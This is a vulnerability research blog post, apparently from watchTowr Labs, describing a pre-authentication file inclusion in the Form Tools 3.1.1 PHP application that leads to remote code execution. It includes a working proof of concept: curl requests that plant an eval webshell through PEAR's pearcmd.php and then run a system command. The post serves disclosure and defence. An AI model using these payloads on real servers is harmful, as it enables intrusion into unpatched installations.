---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-08_form-tools-remote-code-execution-we-need-to-talk-about-php.md
original_filename: 2024-02-08_form-tools-remote-code-execution-we-need-to-talk-about-php.md
title: 'Form Tools Remote Code Execution: We Need To Talk About PHP'
category: documents
detected_topics:
- path-traversal
- sqli
- command-injection
- supply-chain
- automation-abuse
- information-disclosure
tags:
- imported
- documents
- path-traversal
- sqli
- command-injection
- supply-chain
- automation-abuse
- information-disclosure
language: en
raw_sha256: 6295e6d5675bf373f2f46b6df8268dff67f91c21134e14648727c5d19759441d
text_sha256: 541de87e45e2734a4691cfbafa4f885b2cc9c73dfdd328d9dc881d0131785298
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: true
---

# Form Tools Remote Code Execution: We Need To Talk About PHP

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-08_form-tools-remote-code-execution-we-need-to-talk-about-php.md
- Source Type: markdown
- Detected Topics: path-traversal, sqli, command-injection, supply-chain, automation-abuse, information-disclosure
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: True
- Raw SHA256: `6295e6d5675bf373f2f46b6df8268dff67f91c21134e14648727c5d19759441d`
- Text SHA256: `541de87e45e2734a4691cfbafa4f885b2cc9c73dfdd328d9dc881d0131785298`


## Content

---
title: "Form Tools Remote Code Execution: We Need To Talk About PHP"
url: "https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/"
final_url: "https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/"
authors: ["watchTowr (@watchtowrcyber)"]
bugs: ["RCE", "LFI", "Security code review"]
publication_date: "2024-02-08"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 443
---

By — [Sonny](/author/sonny/) — Feb 8, 2024

# Form Tools Remote Code Execution: We Need To Talk About PHP

![Form Tools Remote Code Execution: We Need To Talk About PHP](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1200/2024/02/watchTowr-formtools.png)

When looking across the attack surface of large enterprises, the expectation is the utilisation of well-known heavy-hitting software and appliances. Think your Citrix's, Cisco's, MOVEit's, and other such excitement. 

These products are enterprise-grade, in the sense that they typically go through some sort of security process during development (.. or you’d hope so, anyway) and come up against heavy scrutiny.

However, the reality is that large enterprises (and potentially shadow IT) utilise lesser-known frameworks and CMS’s to fit their tight deadlines. Unfortunately, these smaller-scale implementations typically come with a lower barrier to entry for attackers when hunting for vulnerabilities.

To whet your appetite for what we’re going to demonstrate, below is a deep dive into a Local File Inclusion vulnerability which can lead to Remote Code Execution in installations of ‘[Form Tools’](https://formtools.org/?ref=labs.watchtowr.com), an open-source PHP-based application for creating, storing and sharing forms on the Internet, of over 15 year vintage. A short search across open data platforms reveals over 1,000 installations with "we just discovered Shodan"-tier fingerprints.

Yes, you read it right, another framework that we’ve stumbled across ‘in the wild’ deployed to - once again - recreate the purpose of the magical HTML <form> tag with overly complex server-side logic and functionality. We’re no strangers to over-engineered approaches to simple topics, you only have to take a brief look into our analysis of [Orbeon](https://labs.watchtowr.com/orbeon-forms-the-final-form/) Forms to see our stripes on display.

But… before we go into the technical analysis of this process, and all the fun we had along the way, we thought perhaps we’d share a little philosophical point of discussion that seems to be super-popular in recent times.

# PHP bad?

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2024/02/image.png)

So, is bagging on PHP just a cool bandwagon to jump on? Or is there an actual basis to this viewpoint?

Well, PHP has historically earned a name synonymous with vulnerabilities for a variety of reasons. One of the most obvious is its ‘beginner friendly’ style, with various flavours of dangerous functions beautifully laid out (if you’re not convinced, take a gander at the OWASP ‘no-no’ guide).

Sure, there are battle-hardened frameworks, such as Laravel and WordPress. While these frameworks seem to have less frequent issues, the reality for most developers (including, in our experience, large enterprises) is that custom-built PHP code is still required, where nasty bugs can creep in.

It is no coincidence that, if you started your offensive security journey with a certification, CTF, or training, you most likely rapidly encountered a vulnerable PHP application. It’s an incredibly straightforward platform in which to demonstrate vulnerabilities such as Local or Remote File Inclusion, SQL Injection, or various deserialization issues (the list could go on).

Here at watchTowr, we have a variety of backgrounds, from Red Teaming to Bug Bounty Hunting, and many of us share the same workflow when we come across PHP applications in the wild:

  1. Is it PHP?
  1. Is it custom?
  1. LFG!

Sure, not everyone will have the same opinion (and that’s OK - they’re missing out on those sweet sweet PHP vulnerabilities, more for us).

# Aprons On

Now that we’re finished philosophising, let’s take a look at Form Tools. As usual, we like to make sure the researchers at home can follow along, so to get started, grab your apron, get to your stations, and fire up the following Docker image to get you going:
  
  
  version: '3.8'
  
  services:
  # Apache with PHP
  web:
  image: php:7.4-apache
  ports:
  - "8088:80"
  depends_on:
  - db
  entrypoint: 
  - "bash"
  - "-c"
  - "apt-get update -y &&
  apt-get install unzip -y &&
  docker-php-ext-install pdo pdo_mysql && 
  docker-php-ext-install mysqli && 
  docker-php-ext-enable mysqli && 
  curl '<https://formtools.org/download/packages/Formtools-3.1.1-02202026.zip>' -o /tmp/Formtools.zip &&
  unzip /tmp/Formtools.zip -d /var/www/html/ &&
  apache2-foreground &&
  chmod -R a+rw /var/www/html/formtools"
  
  # MySQL
  db:
  image: mysql:8.0
  environment:
  MYSQL_ROOT_PASSWORD=***REDACTED***
  MYSQL_DATABASE: mydatabase
  MYSQL_USER: myuser
  MYSQL_PASSWORD=***REDACTED***
  volumes:
  - ./db_data:/var/lib/mysql
  ports:
  - "3308:3306"
  

A quick `docker compose up -d` will get the server ready and accessible at [http://localhost:8088/formtools/](http://localhost:8088/formtools/?ref=labs.watchtowr.com) .

# Sort This Mess Out

In previous blogs, we’ve gone into detail on how to map out the attack surface of Java applications and servlets. In traditional PHP applications such as this, it's actually pretty straightforward, so no real detail is needed. There is a bit of clutter and noise involved, but we’ll go through how to find the juicy-ripe files to look at including in our dish.

All files within the webroot are directly accessible and exposed to the network by the web server, but we’re interested specifically in functionalities provided by the PHP application which are available from a pre-authenticated perspective for the max impact that we’re cooking up.

A quick `find` command can be used to extract a list of PHP files accessible in the webroot. In total, there should find 1043 php files to look at.

By just blasting HTTP requests without authentication material at this list against the web server, we can see a common 302 redirect to “`/?message=notify_no_account_id_in_sessions`” in a number of responses.

To identify where this is coming from, we can look at a quick-and-obvious example that checks for auth in `/admin/client/index.php`:
  
  
  <?php
  
  require_once("../../global/library.php");
  
  use FormTools\\Administrator;
  use FormTools\\Clients;
  use FormTools\\Core;
  use FormTools\\General;
  use FormTools\\Pages;
  use FormTools\\Sessions;
  use FormTools\\Themes;
  
  Core::init();
  Core::$user->checkAuth("admin");
  

Those that are fluent in common sense will likely determine that the `checkAuth()` function checks to see if authentication has taken place. Therefore, let’s discard any files tested that redirect (and thus have this check), and look further down the list of our hits (tl;dr 1043 minus 76).

To further refine our focus, we can approach the following filtration techniques:

  * Removing any script which presents an error, stack trace or 500 status code (not uninteresting per se - but for this ‘first glance’ we want access to files which execute successfully).
  * Removing any files which contain `module`, `lib`, `class` or `vendor` in their path. These files are typically included in other files, as opposed to those intended to be executed by users directly.

Fast-forward using this approach, and we’re able to retrieve a handful of files that are of interest. From our initial 1043, we’re down to 7 files:

  * /index.php
  * /forget_password.php
  * /install/index.php
  * /install/actions-installation.php
  * /error.php
  * /process.php
  * /admin/index.php

Now, your spidey-sense is probably the same as ours - the file that stood out most to us was `/install/actions-installation.php`, simply because installation files should be very off-limits on a production server after the setup process has been completed. We’ve seen remnants of the installation procedure be a recent cause for concern with Atlassian’s Confluence, for example (we’re thinking of CVE-2023-22518, in which a leftover setup endpoint could be used to reset the administrative password).

When manually inspecting PHP files, you typically need to train your eyes to look for user input that comes in through PHP global variables such as `$_GET`, `$_REQUEST` , and `$_POST` (and others). This will be where your nefarious ideas can take control as we push our data through the labyrinth of code.

On lines 21-23 of this file, we can see the consumption from both `GET` and `POST` parameters of a “`lang`” variable:
  
  
  $currentLang = General::loadField("lang", "lang", Core::getDefaultLang());
  $request = array_merge($_GET, $_POST);
  Core::setCurrentLang($currentLang);
  

Tracing the origin of the function `setCurrentLang` leads us to `/global/code/Core.class.php` , line 641:
  
  
  public static function setCurrentLang($lang)
  {
  self::$currLang = $lang;
  self::$translations = new Translations(self::$currLang);
  self::$L = self::$translations->getStrings();
  }
  

Further diving into the instantiation of the `Translations` object takes us to `/global/code/Translations.class.php` where we can see the sink for the parameters value:
  
  
  class Translations
  {
  private $list;
  private $L;
  
  function __construct($lang) {
  $json = file_get_contents(__DIR__ . "/../lang/manifest.json");
  $translations = json_decode($json);
  
  // store the full list of translations
  $this->list = $translations->languages;
  
  // now load the appropriate one. This may be better with an autoloader & converting the lang files to classes.
  $lang_file = $lang . ".php";
  include(realpath(__DIR__ . "/../lang/{$lang_file}"));
  
  if (isset($LANG)) {
  $this->L = $LANG;
  }
  }
  

If your eyes are not trained to hone in on questionable PHP code quite yet, fear not.

You can see the line where the parameter `$lang` is concatenated with a `".php"` string before being used with an `include()` function.

Hopefully, your brain is now in tune, and you can see where we’re heading! That’s right, we’re playing with that OWASP original, Local File Inclusion (LFI).

> If you’re simply too young to have remembered a time when these were prolific, and you could shell half the Internet with this _one simple trick_ , some good reading can be found at OWASP - [https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion?ref=labs.watchtowr.com).

In a typical scenario where you’re looking to exploit an LFI in a PHP application, we would simply inject PHP code into web server logs or another predictable location, and then use our LFI to include this file (where PHP automatically expects the contents to be PHP), riding our way to Remote Code Execution.

However, given that our user-controlled input is suffixed with the `.php` string before being passed into the include() function, we’re at a disadvantage - we simply can’t include any file without a `.php` extension.

In older versions of PHP (<5.3), it was possible to truncate the value of a string by injecting a large enough value (4096 chars), and in other versions, you could use null bytes (HTTP-encoded as `%00`) to just discard the remainder of the string. However, we’re playing with new tech here - modern problems require modern solutions, old techniques aren’t going to cut it.

Before we start driving for our ultimate goal of Remote Code Execution, we first need to validate that local file inclusion has taken place.

A simple request to the endpoint with an erroneous value for the `lang` param gives us this insightful PHP error:
  
  
  curl -i -s -k -X $'GET' \\
  -H $'Host: localhost:8088' \\
  $'<http://localhost:8088/formtools/install/actions-installation.php?lang=/>'
  
  
  
  <br />
  <b>Warning</b>:  include(): Filename cannot be empty in <b>/var/www/html/formtools/global/code/Translations.class.php</b> on line <b>23</b><br />
  <br />
  <b>Warning</b>:  include(): Failed opening '' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/formtools/global/code/Translations.class.php</b> on line <b>23</b><br />
  

Shazam! We’re on to something - the response tells us that we control the contents of the include() call, and we’re definitely onto something. Perhaps to further verify, we can include one of the other PHP files within the webroot, such as `process.php` :
  
  
  curl -i -s -k -X $'GET' \\
  -H $'Host: localhost:8088' \\
  $'<http://localhost:8088/formtools/install/actions-installation.php?lang=../../process>'
  
  
  
  The "<b>error.tpl</b>" template could not be located at the following locations:
  <b>/var/www/html/formtoolsz/themes/default/error.tpl</b> and <b>/var/www/html/formtoolsz/themes/default/error.tpl</b>.
  

Perfect - the difference in responses indicates that we’re able to control, via user input, the string being parsed to an `include()` function. With our prior thinking confirmed, we’re well on the road to success.

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2024/02/image-1.png)

# Cooking Up A Storm

So let’s take stock of the available ingredients for our exploitation. We have:

  * A Local File Inclusion
  * Which is pre-authentication
  * Which supports arbitrary directory traversal
  * But is limited to including files ending in “.php”.

The filename limitation can be quite damaging to our recipe for success, but it’s not time to be discouraged. Like the Michelin-star chefs that we are, it's time to cook!

At first we looked at modern day ways to truncate the string, blasting through large character variations and using all sorts of bytes at the end of the parameter value in an attempt to somehow get us out of this predicament. All of this, sadly, was futile, like attempting to cook an omelette with no eggs.

Our aim here isn’t to find a zero-day in PHP (Editors note: ahem), so we had to think outside the box.

What do we know? 

Well, we know that we can include any PHP file that exists on the file system but we’re kind of back to square one when it comes to including the known PHP files we started with (the huge list of 1043 files) - but frankly, this sounds like a lot of work.

Once again, remembering the words of scientists and lawyers - work smart, never hard (ever) - we decided to look deeper in the cupboards to find the seasoning we need.

At the start of the blog, we demonstrated h4x0r skills when we used the `find` command to discover all the `*.php` files available to us in the webroot.

Imagine we reran this command - but this time, slightly differently. How about we run this command again, but this time from the root of the server? Doing this, we can observe a large number of PHP scripts outside the webroot. Interesting!

After we recovered from a moment of intense self-praise, a directory (`/usr/local/lib/php/PEAR` ) stood out - especially as it is normally inaccessible via the webserver. For those unaware, the PEAR PHP framework ([https://pear.php.net/](https://pear.php.net/?ref=labs.watchtowr.com)) is installed by default on many Docker containers that use PHP - and most modern-day systems.

Could PEAR be the secret ingredient needed to make our dish palatable? A secret stash of herbs and spices usually hidden from the attacker, but newly-accessible with our LFI?

> Editors note: We need to ban food-related puns, absolutely never again. I will actually claw my eyes out.

# Let Them Cook

A bit of Internet sleuthing later - using all those h4x0r skills we discussed earlier - we looked for prior art around the PEAR package, specifically noting that `pearcmd.php` is quite popular in CTF’s and typically in conjunction with Local File Inclusions… fancy that!

Anyway, we dug into `pearcmd.php` to see how it works. On line 57 a variable `$argv` is set from a function `readPHPArgv()` .
  
  
  $argv = Console_Getopt::readPHPArgv();
  

Looking deeper at the function in `/usr/local/lib/php/Console/Getopt.php` on line 349 shows us the following PHP block:
  
  
  public static function readPHPArgv()
  {
  global $argv;
  if (!is_array($argv)) {
  if (!@is_array($_SERVER['argv'])) {
  if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
  $msg = "Could not read cmd args (register_argc_argv=Off?)";
  return PEAR::raiseError("Console_Getopt: " . $msg);
  }
  return $GLOBALS['HTTP_SERVER_VARS']['argv'];
  }
  return $_SERVER['argv'];
  }
  return $argv;
  }
  

Once again, your eyes should be honing in on that sweet `$_SERVER` method, feeding in values from a HTTP request URL (assuming the PHP environment variable `register_argc_argv` is set to true). These values are returned as global variables for the `$argv` parameter.

What follows is a flurry of functions and class calls, passing our parameters around like hot potatoes, far too deep to go into real detail here. Eventually, though, we end up in `/PEAR/Command/Config.php` where we can execute certain functions, such as `config-create` via `doConfigCreate()` and then `writeConfigFile()`, which allows us to write data to an arbitrary file path with the right parameter format:
  
  
  function writeConfigFile($file = null, $layer = 'user', $data = null)
  {
  $this->_lazyChannelSetup($layer);
  if ($layer == 'both' || $layer == 'all') {
  foreach ($this->files as $type => $file) {
  $err = $this->writeConfigFile($file, $type, $data);
  if (PEAR::isError($err)) {
  return $err;
  }
  }
  return true;
  }
  
  if (empty($this->files[$layer])) {
  return $this->raiseError("unknown config file type `$layer'");
  }
  
  if ($file === null) {
  $file = $this->files[$layer];
  }
  
  $data = ($data === null) ? $this->configuration[$layer] : $data;
  $this->_encodeOutput($data);
  $opt = array('-p', dirname($file));
  if (!@System::mkDir($opt)) {
  return $this->raiseError("could not create directory: " . dirname($file));
  }
  
  if (file_exists($file) && is_file($file) && !is_writeable($file)) {
  return $this->raiseError("no write access to $file!");
  }
  
  $fp = @fopen($file, "w");
  if (!$fp) {
  return $this->raiseError("PEAR_Config::writeConfigFile fopen('$file','w') failed ($php_errormsg)");
  }
  
  $contents = "#PEAR_Config 0.9\\n" . serialize($data);
  if (!@fwrite($fp, $contents)) {
  return $this->raiseError("PEAR_Config::writeConfigFile: fwrite failed ($php_errormsg)");
  }
  return true;
  }
  

Who are we kidding - you’re looking for the finished recipe right? 

> Editors note: Make it end

Well, to get into `config-create` and write your nefarious code to disk, just use the following `CURL` command:
  
  
  curl -i -s -k -X $'GET' \\
  -H $'Host: localhost:8088' \\
  $'<http://localhost:8088/formtools/install/actions-installation.php?lang=+config-create+/&lang=../../../../../../usr/local/lib/php/pearcmd&/><?=eval($_POST[1]);?>+/tmp/watchTowr.php'
  

Then re-include our malicious script with an `id` command in the `POST` parameter `1` :
  
  
  curl -i -s -k -X $'POST' \\
  -H $'Host: localhost:8088' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 52' \\
  --data-binary $'lang=../../../../../../tmp/watchTowr&1=system(\\'id\\');' \\
  $'<http://localhost:8088/formtools/install/actions-installation.php>'
  

The proof is in the pudding:

> Editors note: For the love of God
  
  
  HTTP/1.1 200 OK
  Date: Wed, 07 Feb 2024 05:33:34 GMT
  Server: Apache/2.4.54 (Debian)
  X-Powered-By: PHP/7.4.33
  Set-Cookie: PHPSESSID=1f39edb68b6a402720fb16fc4b638675; path=/
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: private
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Length: 1493
  Connection: close
  Content-Type: text/html; charset=utf-8
  
  #PEAR_Config 0.9
  a:13:{s:7:"php_dir";s:82:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/php";s:8:"data_dir";s:83:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/data";s:7:"www_dir";s:82:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/www";s:7:"cfg_dir";s:82:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/cfg";s:7:"ext_dir";s:82:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/ext";s:7:"doc_dir";s:83:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/docs";s:8:"test_dir";s:84:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/tests";s:9:"cache_dir";s:84:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/cache";s:12:"download_dir";s:87:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/download";s:8:"temp_dir";s:83:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/temp";s:7:"bin_dir";s:78:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear";s:7:"man_dir";s:82:"/&lang=../../../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /pear/man";s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}}
  

# Cleaning The Dishes

![](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2024/02/image-3.png)

As with all of our research, it's not enough to just find bugs, we need to help fix the problems.

> Editors note: This is news to me

To do this, we contacted the developers of Form Tools on several occasions, and while communication was initially fluid, this communication shortly ceased and our developer friend went MIA.

We understand in the world of open source tools, maintaining code comes with time and effort, and eventually you have to let go and put your project out to pasture.

The developer was quite frank with us that the project is no longer under active development so we can’t fault them for the urge to look for new ventures.

Unfortunately for the servers we see online, this leaves them without an answer and opens them up to exploitation. If you are running a vulnerable version of Form Tools (version 3.1.1) we suggest removing the file `/install/actions-installation.php` after installation or blocking access via a `.htaccess` /proxy rule set.

# Timeline

Date | Detail  
---|---  
5th November 2023 | Vulnerability discovered  
6th November 2023 | Requested security contact for Form Tools  
16th November | watchTowr hunts through client's attack surfaces for impacted systems and communicates with those affected.  
16th November 2023 | Received security contact, disclosed to Form Tools  
2nd January 2024 | Contacted Form Tools developers for update and to offer remediation help  
11th January 2024 | Followed up again to offer help and to ask for an update  
8th February 2024 | Blogpost and PoC released to public  
  
The research published by [watchTowr Labs](https://watchtowr.com/) is powered by the same engine behind the [watchTowr Platform](https://watchtowr.com/), our **Preemptive Exposure Management** solution built for enterprises that refuse to wait for the next satisfying advisory from their scanner vendor.

The [watchTowr Platform](https://watchtowr.com/) combines **External Attack Surface Management** and **Continuous Automated Red Teaming** to test your defenses against the vulnerabilities and techniques that matter: the ones real attackers are actually exploiting.

### Gain early access to our research, and understand your exposure, with the watchTowr Platform

[REQUEST A DEMO](https://watchtowr.com/demo/)
